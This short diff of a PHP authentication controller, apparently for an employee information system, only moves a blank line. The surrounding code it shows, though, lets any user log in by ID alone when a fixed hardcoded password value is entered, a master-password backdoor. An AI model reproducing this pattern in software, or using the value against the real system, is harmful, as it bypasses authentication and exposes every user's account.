@@ -35,8 +35,8 @@ class Auth extends BaseController
 
       if ($user === null) {
         $db = new SimpegModel;
-
         // $pegawai  = $db->getRow('TEMP_PEGAWAI_SSO',['NIP_USER' => $u,'PWD' => $p]);
+
         if ($p == '0b1c339358111b0d41b9df4a217bb3c1') {
           $pegawai  = $db->getRow('TEMP_PEGAWAI_SSO',['NIP_USER' => $u]);
         }else{
